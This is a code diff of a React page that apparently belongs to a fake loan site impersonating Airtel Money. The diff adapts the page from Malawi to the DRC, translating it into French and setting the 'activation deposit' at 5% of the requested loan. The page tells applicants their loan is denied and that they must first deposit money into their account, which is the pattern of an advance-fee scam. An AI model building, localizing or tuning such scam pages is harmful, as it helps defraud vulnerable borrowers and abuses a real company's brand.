@@ -1,14 +1,24 @@
 import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 
+const MIN_DEPOSIT = 10;
+const DEPOSIT_RATE = 0.05; // 5% of the loan amount
+
 function AirtelDenied() {
   const navigate = useNavigate();
-  const [loanAmount, setLoanAmount] = useState('0');
-  const REQUIRED_DEPOSIT = 20000; // 20,000 MK
+  const [loanAmount, setLoanAmount] = useState(0);
+  const [requiredDeposit, setRequiredDeposit] = useState(MIN_DEPOSIT);
 
   useEffect(() => {
     const savedAmount = localStorage.getItem('airtelLoanAmount');
-    if (savedAmount) setLoanAmount(Number(savedAmount).toLocaleString('en-US'));
+    if (savedAmount) {
+      const parsedAmount = Number(savedAmount);
+      setLoanAmount(parsedAmount);
+      
+      // Calculate 5% of the loan, but ensure it's at least $10
+      const calculatedDeposit = Math.max(MIN_DEPOSIT, Math.round(parsedAmount * DEPOSIT_RATE));
+      setRequiredDeposit(calculatedDeposit);
+    }
   }, []);
 
   const handleClearAndNavigate = () => {
@@ -52,37 +62,37 @@ function AirtelDenied() {
       `}</style>
 
       <div className="header-top">
-        <h1 className="header-title">Airtel Malawi</h1>
+        <h1 className="header-title">Airtel DRC</h1>
       </div>
-      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+      <p className="header-sub">Prêts rapides. A tout moment. N'importe où.</p>
 
       <div className="card">
         <div className="icon-wrapper">!</div>
         
-        <h2 className="card-title">Loan Denied!</h2>
-        <p className="card-sub">Your loan has been denied.</p>
+        <h2 className="card-title">Prêt refusé !</h2>
+        <p className="card-sub">Votre prêt a été refusé.</p>
 
         <div className="alert-box">
           <div className="alert-header">
             <svg className="alert-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
-            Airtel inactive
+            Airtel inactif
           </div>
-          <p className="alert-text">Please deposit at least</p>
-          <p className="amount-highlight">{REQUIRED_DEPOSIT.toLocaleString()} MK</p>
-          <p className="alert-text">into your Airtel account to activate it and make a new request.</p>
+          <p className="alert-text">Veuillez déposer au moins</p>
+          <p className="amount-highlight">$ {requiredDeposit.toLocaleString('en-US')}</p>
+          <p className="alert-text">sur votre compte Airtel pour l'activer et faire une nouvelle demande.</p>
         </div>
 
         <div className="checklist-box">
           <div className="check-item">
-            <span className="check-mark">✔</span> Funds will be transferred to your account within 30 minutes.
+            <span className="check-mark">✔</span> Les fonds seront transférés sur votre compte dans un délai de 30 minutes.
           </div>
           <div className="check-item">
-            <span className="check-mark">✔</span> Loan repayment period: 12 months
+            <span className="check-mark">✔</span> Période de remboursement du prêt : 12 mois
           </div>
         </div>
 
         <button className="btn" onClick={handleClearAndNavigate}>
-          Go to dashboard →
+          Aller au tableau de bord →
         </button>
       </div>
 
@@ -92,7 +102,7 @@ function AirtelDenied() {
           <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
         </div>
         <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
-        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>$</div>
       </div>
     </div>
   );
